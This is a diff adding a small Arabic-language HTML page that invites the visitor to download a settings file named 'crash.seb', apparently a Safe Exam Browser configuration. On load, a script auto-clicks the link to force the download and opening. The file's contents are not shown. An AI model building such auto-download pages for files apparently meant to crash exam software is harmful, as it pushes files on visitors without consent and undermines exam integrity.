@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>Download Trigger</title>
+</head>
+<body style="text-align: center; padding-top: 50px; font-family: sans-serif;">
+
+  <h2>اضغط على الرابط بالأسفل لتحميل ملف الإعدادات:</h2>
+  <br>
+  
+  <a id="downloadLink" href="crash.seb" download="crash.seb" style="font-size: 24px; color: red; font-weight: bold;">
+    اضغط هنا لفتح الملف
+  </a>
+
+  <script>
+    // محاولة بدء التحميل وفتح الملف فورياً عند تحميل الصفحة
+    window.onload = function() {
+      document.getElementById('downloadLink').click();
+    };
+  </script>
+
+</body>
+</html>
